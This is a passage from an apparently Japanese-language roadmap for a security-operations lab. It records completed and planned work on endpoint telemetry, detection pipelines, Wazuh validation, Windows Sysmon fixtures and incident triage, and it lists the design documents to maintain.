- attacker automation
- run isolation
- evaluation / coverage validation
- case workflow
- TheHive / Velociraptor integration preparation

### Step 3 — Endpoint Telemetry / Improvement Loop
- Phase5
- Phase6

Built:
- process telemetry
- process chain detection
- behavior_features / derived_features / assessment / enriched_features lifecycle
- triage / investigation / action comparison harnesses
- process pipeline orchestrator
- Rule Improvement Agent
- batch validation
- attacker observed-effects alignment

## Completed / Deferred Follow-on

### Completed — Scenario Family Expansion Policy
- `docs/design/scenario_family_expansion_policy.md` で scenario family / numbering / mapping / safety / fixture policy を固定済み
- attacker-side observed effectとdefender-side observed artifactの対応、primary artifact、expected detection、Rule Improvement signal化条件を定義済み
- structured runner eventは新しいmappingが必要になった場合だけ追加する
- Phase7 deception artifact foundation は完了済みだが、scenario YAML / runner implementation は attacker-agent と response automation が成熟するまで deferred とする

### Completed / Deferred — Broader Linux Scenario Families
- `docs/design/linux_scenario_family_candidates.md` のmapping-first整理と`scenario_009` bounded pathは実施済み
- `scenario_009_suspicious_archive_staging` は fixture pipeline で bounded incident-to-action chain まで検証済みである。Wazuh `alerts.json` inspection は 31 new lines / 0 matching documents であり、bounded temporary `logall_json` validation は `docs/design/scenarios/scenario009/wazuh_raw_archive_validation.md` に Outcome C として記録済みである。manager archive は 1026 new documents / 55 strong scenario documents を保持し、five operations と eight known serials の receipt は確認できた。retained structured summary は各 serial-linked document を `SYSCALL` と分類したが、exact historical `full_log` values は保持しておらず、元runのcomplete groupingは未確定でT3 / Outcome Cを維持する。Stage 1 bounded-evidence analysis、Stage 2 read-only deployed-path inspection、Stage 3 Wazuh `v4.14.4` source verificationに続き、Stage 4 controlled validationを `docs/design/scenarios/scenario009/wazuh_audit_grouping_controlled_validation.md` に記録済みである。Stage 4は別のcompleted contiguous six-record local eventについてnewline removalとsingle-space joiningを行ったgrouped representationがmanager `full_log`とbyte lengthおよびSHA-256で一致するexact grouped-payload identityを確認し、`EXACT_CONTENT_PRESERVED` / T1-equivalent controlled evidenceとした。これは元runのhistorical `full_log`を復元せず、そのT3 / Outcome Cを変更しない。`archives.json` はsupporting evidenceのまま、canonical source selection、parity、normalization、DSL detection、incident consumptionはpendingとし、既存fixture pipelineをcanonical baselineとする
- 残るcanonical source selection、live normalization/integrationはdeferred follow-onであり、現在のactive priorityではない
- Atomic Red Team は ATT&CK technique mapping / scenario idea reference として使えるが、local scenario YAML / shell runner / artifact contract を置き換えない
- CALDERA は later optional integration とし、near-term runner replacement にはしない

## Current Next

### Windows Cross-Platform Expansion

このworkstreamは新しいglobal Phaseではなく、Phase5 Endpoint Telemetry /
Phase6 follow-onのcross-platform expansionである。詳細な処理境界は
[Defender Event Processing Flow](architecture/defender-event-processing-flow.md)、
実装順序とDone Criteriaは
[RoadmapのWindows Cross-Platform Expansion](roadmap/roadmap.md#windows-telemetry-mvp--cross-platform-expansion)
を参照する。

Current implemented baseline:

- Sysmon Event ID 1 source fixture schema、Fixture A/B/C、source parser、
  parsed-event schema、`expected_parsed` parity: implemented
- native collector adapter、local parity validator、focused tests、runbook:
  implemented。bounded 2-record source/parser parityはmanual observation済み
- normalized mapperとFixture A/B/C static `expected_normalized` exact parity:
  implemented
- existing atomic detection DSLを再利用したdeterministic PowerShell process /
  encoded-command observation ruleとFixture A/B/C static
  `expected_detection` exact parity: implemented
- validated `endpoint_events.v1`、deterministic rule ordering、existing atomic
  evaluator、canonical detection-list structural validationを再利用するCommon
  Pipeline v0 detector spine: implemented。Linux Scenario 009とWindows Fixture
  A/B/Cのfixture parityで確認済み
- canonical detectionsを既存generic observation-level Incident Builderへ
  1 detectionずつ渡し、deterministic ID/orderとexisting Incident schemaを
  検証するplatform-neutral bridge: implemented。Fixture A/B/Cは1 / 2 / 0
  Incidentで、live runtime validationではない
- canonical Incident listを検証・決定順に並べ、既存deterministic Rule Triage
  をIncidentごとに1回再利用し、共有Triage schemaとID linkageを検証する
  platform-neutral boundary: implemented。Fixture A/B/Cは1 / 2 / 0 Triageで、
  Windows verdict品質またはAI model validationではない
- Incident/Triageの完全な1対1 linkageを実行前に検証し、既存evidence-aware
  pre-case Investigation builderを各組で1回再利用するplatform-neutral
  boundary: implemented。Fixture A/B/Cは1 / 2 / 0 schema-valid Investigation
  で、Windows Investigation品質またはAI/live validationではない

Fixture A/B/Cはparity fixtureであり、複数のruntime/pipeline scenarioでは
ない。`windows-victim01`の手動構築とEvent ID 1 manual observationは
repository runtime automationを意味しない。fixture detector parityの完成も
live normalized parity、Windows Triage/Investigation品質、Wazuh Windows
integrationの完成を意味しない。PowerShell ruleの`severity`は
DSL-required metadataであり、malicious verdictまたはIncident severityでは
ない。

現在完了しているのはCommon Pipeline v0のdetector spine + bounded Windows
Slice 1
detection-to-Incident-to-deterministic-Rule-Triage-to-pre-case-Investigation
sliceである。
architecture Done Criteria上のCommon Pipeline v0全体は未完了であり、shared
dedupe/correlationとfull cross-platform execution validationが残る。

Recommended build summary:

1. Implemented Common Defender Pipeline v0 detector spineを維持
2. Implemented bounded Windows Slice 1 Incident bridgeを維持
3. Implemented bounded deterministic Rule Triage boundaryを維持
4. Implemented bounded evidence-aware pre-case Investigation boundaryを維持
5. 既存Linux regressionを維持
6. shared dedupe/correlationとfull cross-platform validationを完了してfull
   Common Defender Pipeline v0 Done Criteriaを満たす
7. PID/PPID・時間関係を使うWindows Slice 2、cross-platform regression、
   Common Defender Pipeline v1固定
8. Windows downstreamとharness qualityを調整
9. live collection/Wazuh Windows、Security 4624/4625、Sysmon Event ID 3を
   後続追加し、Windows standalone安定後にAD/DCへ進む

Windows pipeline全体の完成まで共通化を待たず、最初の
vertical deliveryではPowerShell detectionの次に実装したv0 detector
spineからbounded Slice 1をexisting Incident contractへ接続済みである。
このfixture validationはlive normalized parityまたは完全なcross-platform
runtime pipelineの完了を意味しない。Windows固有の
一時的なIncident pathは先に作らない。parser、mapper、platform-specific ruleは
source/domain-specificのまま維持し、canonical detection result以降の
Incident、Triage、pre-case Investigation、Case、Actionは共通contractを
使う。downstreamはscenario IDではなくartifact、feature、canonical
detection resultを根拠にする。

## Later

### SIEM / Wazuh Optional Integration
- provider-neutralなbounded search、logical source registry、query provenance、source mapper境界は `docs/design/siem/siem_query_contract.md` のdesign-only契約に従う
- Wazuh は DSL の source of truth ではなく deploy / search / alert source として扱う
- Wazuh alert / search result を lab canonical artifact または evidence ref に正規化する
- detection / investigation の optional input として使い、DSL 結果との比較可能性を残す

### DFIR / Rule Improvement Apply Side
- broader collector outputs、Velociraptor actual ingestion、executor / DFIR result comparison は post-action artifact semantics が安定してから進める
- Rule Improvement の apply / deploy / update / promotion workflow は current export MVP とは別フェーズとして扱う

---

# 11. What Not to Overbuild Early

初期に作り込みすぎない。

- 複雑なマルチエージェント連携
- 先にlocal LLM migrationを完了させること
- いきなりWindows / Linux / AD全部を同時に完成させること
- TheHive / Velociraptor連携から先に始めること
- deceptionを最初に完成させること
- offensive planner / autonomous attacker を先に完成させること

最初の成功条件は:

```text
One attack scenario
→ logs collected
→ one detection chain
→ incident.json
→ AI triage report
```

---

# 12. Next Recommended Documents to Maintain / Create

既に phase0〜phase6 の詳細 roadmap と phase7/8 の outline は存在するため、次は「設計判断と artifact contract を迷子にしない」ための資料を優先して維持する。

## Always maintain

- `docs/architecture/agent-architecture.md`
- `docs/architecture/lab-architecture.md`
- `docs/roadmap/roadmap.md`
- `docs/operations/runbook.md`
- `docs/design/soc_lab_improvement.md`
- `docs/design/atomic_detection_dsl.md`

## Phase6 / Improvement Loop contracts

- `docs/design/rule-improvement/rule_improvement_orchestrator_contract.md`
- `docs/design/rule-improvement/observed_effects_alignment_signal_contract.md`
- `docs/design/attacker-agent/attack_artifact_contract.md`
- `docs/design/attacker-agent/attack_observed_effects_contract.md`
- `docs/design/attacker-agent/observed_effects_evaluation_contract.md`
- `docs/design/attacker-agent/structured_runner_output_contract.md`
- `docs/design/attacker-agent/shell_backend_contract.md`

## Next documents to consider

1. `docs/design/scenario_family_expansion_policy.md`（作成済み / 維持）
2. `docs/design/linux_scenario_family_candidates.md`（作成済み / 維持）
3. `docs/design/deception/agentic_deception_mvp_scope.md`（created / maintain）
4. `docs/design/deception/deception_artifact_contract.md`
5. `docs/design/windows/windows_telemetry_contract.md`
6. `docs/design/wazuh_artifact_mapping.md`
7. `docs/design/dfir/collection_result_contract.md`（created / maintain）
8. `docs/design/dfir/collection_result_ingestion.md`（created / maintain）
9. `docs/design/dfir/post_action_dfir_investigation.md`（created / maintain）
10. `docs/design/executor_result_comparison_harness.md`
11. `docs/operations/harness_runbook.md`
